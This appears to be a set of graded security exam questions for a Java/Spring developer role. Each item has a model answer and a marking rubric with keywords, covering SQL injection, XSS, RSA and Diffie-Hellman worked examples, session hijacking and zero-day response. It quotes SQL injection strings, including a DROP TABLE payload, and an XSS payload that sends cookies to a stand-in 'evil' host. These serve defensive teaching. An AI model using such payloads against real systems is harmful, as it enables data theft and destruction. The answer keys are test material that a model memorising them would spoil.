## What is SQL injection? Show how a login query can be attacked, and how to prevent it in a Java/Spring application.
@descriptive 10
**SQL injection** happens when user input is concatenated into a SQL statement, so the input changes the **structure** of the query instead of being treated as data.

**Vulnerable code:**
~~~java
String sql = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
~~~
If the attacker enters the username {{admin' --}}, the query becomes {{… WHERE username = 'admin' --' AND password = '…'}}. The {{--}} comments out the password check, so the attacker logs in as admin. A password of {{' OR '1'='1}} makes the WHERE clause always true. {{'; DROP TABLE loan; --}} can destroy data if the driver allows stacked queries.

**Impact:** data theft (member NIDs, loan records), altered balances, authentication bypass, and in the worst case control of the database server.

**Prevention, in layers:**
1. **Parameterised queries (prepared statements).** This is the main fix: the SQL structure is fixed, and the input is always data.
~~~java
PreparedStatement ps = conn.prepareStatement("SELECT id, password_hash FROM users WHERE username = ?");
ps.setString(1, user);
~~~
2. **JPA/Spring Data** with named parameters: {{@Query("select u from User u where u.username = :name")}}. Never concatenate strings into JPQL or native queries.
3. **Allow-list validation** for anything that can't be a parameter (sort column, table name).
4. **Least privilege:** the application's database user can't DROP tables or read other schemas.
5. **No detailed SQL errors** shown to users. Log them on the server.
6. **Defence in depth:** a WAF, SAST tools (SonarQube) and penetration tests. Passwords are stored as bcrypt hashes and checked in code, not in the WHERE clause.
+ 2 | Definition: input changes query structure | concatenat
+ 2 | Concrete attack string and resulting query | ' or '1'='1/--
+ 1 | Impact | bypass/theft
+ 3 | Parameterised queries / PreparedStatement / JPA parameters shown | preparedstatement, ?
+ 2 | Other layers: least privilege, validation, error handling, WAF | least privilege

## What is cross-site scripting (XSS)? Explain its types and how to prevent it in a React/Angular frontend with a Spring Boot backend.
@descriptive 10
**XSS** lets an attacker inject **JavaScript** that runs in another user's browser on your site. The script then runs with that user's session: it can steal tokens, act as the user, or change the page.

| Type | How the script arrives | Example |
|---|---|---|
| **Stored** | saved in the database, served to every viewer | a PO name field containing {{<img src=x onerror="fetch('//evil?c='+document.cookie)">}} shown on the PKSF dashboard |
| **Reflected** | echoed back from the request | {{/search?q=<script>…</script>}} printed in the results page |
| **DOM-based** | client JavaScript writes untrusted data into the DOM | {{el.innerHTML = location.hash}} |

**Prevention:**
1. **Output encoding by context.** React ({{\{value\}}} in JSX) and Angular (interpolation) escape output automatically. Avoid the escape hatches: {{dangerouslySetInnerHTML}} and Angular's {{bypassSecurityTrustHtml}}. If rich HTML is required, sanitise it with DOMPurify.
2. **Never build HTML from strings.** Use {{textContent}}, not {{innerHTML}}.
3. **Content-Security-Policy header**, such as {{script-src 'self'}}, which blocks inline and third-party scripts even if one gets injected.
4. **Cookies:** {{HttpOnly}} (JavaScript can't read them), {{Secure}}, {{SameSite}}. Avoid keeping long-lived tokens in {{localStorage}}.
5. **Input validation on the server** (length, allowed characters) as defence in depth. It is not a replacement for output encoding.
6. **Spring Security** sends security headers (X-Content-Type-Options, frame options), and you configure CSP there.
+ 2 | Definition: injected script runs in the victim's browser | browser, script
+ 3 | Stored, reflected and DOM-based types with examples | stored, reflected, dom
+ 3 | Output encoding and framework escaping; avoid dangerouslySetInnerHTML/bypass; sanitise | encod, dangerouslysetinnerhtml
+ 2 | CSP and HttpOnly cookies | csp/content-security-policy, httponly

## Write the RSA algorithm. Using p = 5, q = 11 and e = 3, find the private key and encrypt and decrypt the message m = 9.
@descriptive 10 verified
**Key generation:**
1. Choose two large primes, p and q.
2. n = p × q (the modulus, made public).
3. φ(n) = (p − 1)(q − 1).
4. Choose e with 1 < e < φ(n) and gcd(e, φ(n)) = 1. The **public key** is (e, n).
5. Compute d = e⁻¹ mod φ(n), so that e × d ≡ 1 (mod φ(n)). The **private key** is (d, n).

**Encryption:** c = mᵉ mod n. **Decryption:** m = cᵈ mod n.

**Worked example:**
- n = 5 × 11 = **55**
- φ(n) = 4 × 10 = **40**
- e = 3: gcd(3, 40) = 1 ✓
- d: 3 × d ≡ 1 (mod 40). 3 × 27 = 81 = 2 × 40 + 1, so **d = 27**. Public key (3, 55), private key (27, 55).
- Encrypt m = 9: c = 9³ mod 55 = 729 mod 55 = 729 − 13 × 55 = **14**
- Decrypt: 14²⁷ mod 55 = **9** ✓

(The arithmetic was verified by computation.)

**Security:** knowing n and e, finding d requires φ(n), which requires factoring n. Real keys are 2048 bits or more.
- **Uses:** key exchange in TLS, digital signatures (sign with d, verify with e), JWT RS256 (Keycloak signs tokens with its private key, and services verify with the public key).
- **Practice:** RSA is slow, so it encrypts a symmetric (AES) key, not bulk data. Always use padding (OAEP for encryption, PSS for signatures).
+ 3 | Key generation steps (n, φ, e coprime, d inverse) | φ/phi, inverse
+ 1 | Encryption and decryption formulas | mod n
+ 1 | n = 55 and φ = 40 | 55, 40
+ 2 | d = 27 with justification | 27
+ 2 | c = 14 and decrypts back to 9 | 14
+ 1 | Security basis (factoring) or real-world use | factor

## Explain the Diffie-Hellman key exchange with p = 23, g = 5 and private values a = 6 and b = 15. Then show how a man-in-the-middle who generates two key pairs breaks it, and how this is prevented.
@descriptive 10 verified
**The protocol** (p and g are public):
1. Alice picks a secret a and sends A = gᵃ mod p.
2. Bob picks a secret b and sends B = gᵇ mod p.
3. Alice computes K = Bᵃ mod p; Bob computes K = Aᵇ mod p. Both equal gᵃᵇ mod p.

**Worked example:**
- A = 5⁶ mod 23 = **8**
- B = 5¹⁵ mod 23 = **19**
- Alice: 19⁶ mod 23 = **2**. Bob: 8¹⁵ mod 23 = **2**. The shared key is **2**.

An eavesdropper sees p, g, A and B, but recovering a from A is the **discrete logarithm problem**.

**Man-in-the-middle with two key pairs:** Mallory sits on the path and picks his own secrets, m₁ = 2 and m₂ = 3.
1. He intercepts A = 8 and sends Bob M₂ = 5³ mod 23 = **10**, as if it came from Alice.
2. He intercepts B = 19 and sends Alice M₁ = 5² mod 23 = **2**, as if it came from Bob.
3. Alice computes 2⁶ mod 23 = **18**; Mallory computes 8² mod 23 = 18. **Key K₁ = 18 (Alice ↔ Mallory).**
4. Bob computes 10¹⁵ mod 23 = **5**; Mallory computes 19³ mod 23 = 5. **Key K₂ = 5 (Bob ↔ Mallory).**
5. Mallory decrypts every message with one key, reads or changes it, and re-encrypts it with the other. Neither side notices.

(All values were verified by computation.)

**Why it works:** plain Diffie-Hellman has **no authentication**, so neither side can tell whose public value it received.

**Prevention:** authenticate the exchanged values.
- Sign them with long-term keys: **certificates in TLS** (the server signs its ephemeral DH share), and SSH host keys.
- Use a pre-shared key, or compare key fingerprints out of band.
- In practice, use TLS 1.3 (ECDHE plus a certificate) and validate certificates correctly.
+ 2 | Protocol steps with A, B and K formulas | g^a/gᵃ, mod p
+ 2 | Worked values A = 8, B = 19, K = 2 | 8, 19
+ 3 | MITM: two key pairs, two different keys, decrypt and re-encrypt | intercept, two keys
+ 1 | Reason: no authentication | authentic
+ 2 | Prevention: certificates/signatures (TLS), fingerprints | certificate, sign

## Explain the CIA triad. Relate interception, falsification (modification), masquerade (fabrication) and denial of service to the property each one attacks, and give a control for each in a PKSF system.
@descriptive 10
The **CIA triad** is the three core goals of information security:
- **Confidentiality:** only authorised people can read the data.
- **Integrity:** data is accurate and changed only by authorised parties in authorised ways.
- **Availability:** the system and data are there when needed.

(Authenticity and non-repudiation are often added alongside them.)

| Attack | What happens | Property attacked | Control in a PKSF system |
|---|---|---|---|
| **Interception** | an unauthorised party reads data in transit or at rest (sniffing, stolen backups) | **Confidentiality** | TLS everywhere, encryption at rest, RBAC, data masking for NIDs |
| **Falsification / modification** | data is altered (loan amount changed in transit or in the database) | **Integrity** | hashes/HMAC and digital signatures, DB constraints, audit triggers, least privilege |
| **Masquerade / fabrication** | an attacker pretends to be a legitimate user or system and inserts fake data (a fake PO report) | **Integrity and authenticity** | strong authentication (Keycloak SSO, MFA), signed JWTs, mutual TLS for PO APIs |
| **Denial of service / interruption** | the system is made unavailable (flooding, crashing) | **Availability** | rate limiting at the gateway, autoscaling, redundancy, backups, DDoS protection |

**Types of security control:** preventive (firewall, authentication), detective (ELK/Prometheus alerts, audit logs) and corrective (backups, incident response). A good answer uses layers of all three (defence in depth).
+ 2 | Defines confidentiality, integrity and availability | confidentiality, integrity, availability
+ 4 | Correct mapping of all four attacks | interception, modification, masquerade, denial
+ 3 | A sensible control for each | tls, mfa, rate limit
+ 1 | Mentions authenticity or control types / defence in depth | authenticity/defence

## What is session hijacking? Describe how an attacker steals or fixes a session, and how a Spring Boot application with JWT or session cookies prevents it.
@descriptive 10
**Session hijacking** means taking over a valid user session by obtaining its identifier (a session cookie or token), so the attacker acts as the user without knowing the password.

**How sessions are stolen:**
1. **Sniffing** on plain HTTP or public Wi-Fi.
2. **XSS** reads {{document.cookie}} or a token in {{localStorage}}.
3. **Session fixation:** the attacker plants a known session ID before login, and the application keeps it after login.
4. **Predictable session IDs**, or IDs leaked in URLs and logs.
5. **Malware** or a stolen device.

**Prevention:**
| Layer | Control |
|---|---|
| Transport | **HTTPS only** plus HSTS; {{Secure}} cookie flag |
| Cookies | {{HttpOnly}} (no JavaScript access), {{SameSite=Lax/Strict}} (blocks CSRF) |
| Fixation | **create a new session ID at login**. Spring Security does this by default ({{sessionFixation().migrateSession()}}). |
| Lifetime | idle and absolute timeouts; invalidate the session on logout server-side |
| JWT | short-lived access tokens (5–15 minutes), refresh-token rotation, signature and expiry checked on every request; revoke via Keycloak |
| Binding | detect a changed IP or user agent; re-authenticate before sensitive actions (approving a disbursement) |
| XSS | output encoding plus CSP, so tokens can't be read by injected scripts |

**Spring Boot example:**
~~~java
http.sessionManagement(s -> s
        .sessionFixation(f -> f.migrateSession())
        .maximumSessions(1));     // one active session per user
// HTTPS is enforced at the ingress/load balancer, plus HSTS (on by default in Spring Security)
// application.properties: server.servlet.session.cookie.http-only=true, .secure=true, .same-site=strict, server.servlet.session.timeout=15m
~~~
+ 2 | Definition: take over a valid session via its identifier | session id/token
+ 3 | At least three theft methods, including fixation | sniff, xss, fixation
+ 3 | HttpOnly/Secure/SameSite, HTTPS, new ID at login, timeouts | httponly, secure, samesite
+ 2 | JWT-specific controls (short expiry, refresh rotation, revoke) | expiry/refresh

## A zero-day vulnerability in a library used by PKSF's loan system is being exploited before a vendor patch exists. What could happen, and what would you do during the patch window?
@scenario 10
A **zero-day** is a vulnerability that attackers know and exploit before the vendor has released a fix (the defenders have had "zero days"). Log4Shell (CVE-2021-44228, in Log4j) is the classic Java example.

**What could happen in a financial system:**
- Remote code execution on the application servers, then lateral movement to the database.
- **Data breach:** member NIDs, phone numbers, loan histories (confidentiality).
- **Fraud:** altered disbursement or repayment records (integrity).
- **Ransomware** or outages during month-end reporting (availability).
- Regulatory, legal and reputational damage, and loss of trust from POs and donors.

**Actions during the patch window:**
1. **Identify exposure:** use the SBOM/dependency list (OWASP Dependency-Check, {{mvn dependency:tree}}) to find which services and versions use the library.
2. **Contain:** apply vendor mitigations (a config flag or a disabled feature), add **WAF virtual-patching rules**, restrict egress (block outbound calls from the app servers), and take non-critical exposed services offline.
3. **Reduce blast radius:** network segmentation, least-privilege database accounts, Kubernetes network policies, rotated secrets.
4. **Detect:** raise logging, add ELK/SIEM alerts for known indicators of compromise, watch for unusual outbound connections, and run integrity checks on financial tables (audit triggers, reconciliation).
5. **Respond:** follow the incident-response plan, preserve logs as evidence, and inform management and, where required, the regulator or CERT (BGD e-GOV CIRT).
6. **Patch fast when the fix arrives:** test in staging and roll out through CI/CD with a rollback plan. Afterwards, hold a post-mortem, add dependency scanning to the pipeline, and keep an up-to-date SBOM.
+ 2 | Defines zero-day | zero-day, patch
+ 2 | Realistic impact across C, I and A for a financial system | breach, fraud
+ 2 | Find exposure (SBOM, dependency scan) | dependency/sbom
+ 2 | Containment: WAF virtual patch, mitigation, segmentation, least privilege | waf, segment
+ 2 | Detection, incident response, then patch and post-mortem | monitor/detect, incident

## Compare symmetric encryption, asymmetric encryption and hashing. Which would you use for passwords, for data in transit, and for sensitive columns such as NIDs in PKSF's database?
@compare 10
| | Symmetric encryption | Asymmetric encryption | Hashing |
|---|---|---|---|
| Keys | **one shared secret key** | **public/private key pair** | no key (or a salt; HMAC uses a key) |
| Reversible | yes (decrypt with the same key) | yes (decrypt with the private key) | **no** (one-way) |
| Speed | fast, suits bulk data | about 1000× slower | fast (password hashes are deliberately slow) |
| Algorithms | **AES-256-GCM**, ChaCha20 | **RSA-2048+**, ECC (ECDSA, ECDH) | **SHA-256** (integrity); **bcrypt / Argon2** (passwords) |
| Main problem | distributing the key safely | performance, trusting the public key (PKI) | can't recover the input; weak if unsalted |
| Used for | encrypting data | key exchange, digital signatures | integrity checks, password storage |

**Choices for PKSF:**
- **Passwords:** never encrypted, always **hashed** with **bcrypt** or **Argon2** (salted, slow). Spring's {{BCryptPasswordEncoder}} does this; with Keycloak, the identity provider stores them.
- **Data in transit:** **TLS 1.2/1.3**, which is a hybrid. Asymmetric cryptography (ECDHE plus the certificate signature) agrees a key, and **symmetric AES-GCM** encrypts the traffic.
- **Sensitive columns (NID, phone):** **symmetric AES-GCM** encryption at the application or database level, with keys in a vault or KMS, not in the code. Add a separate keyed hash (HMAC) column if you need to search by NID.
- **Integrity of PO uploads:** a SHA-256 checksum, or an **RSA/ECDSA signature** to prove who sent the file.
- **JWT:** RS256 signatures (asymmetric). Services verify Keycloak's tokens with its public key.
+ 3 | Correct key model and reversibility for each | shared key, public, one-way
+ 2 | Algorithms named correctly (AES, RSA/ECC, SHA-256/bcrypt) | aes, rsa, bcrypt
+ 2 | Passwords: bcrypt/Argon2 hashing, not encryption | bcrypt/argon2
+ 2 | TLS as a hybrid; AES for columns with key management | tls, hybrid
+ 1 | Signatures/JWT or integrity checksum use | signature
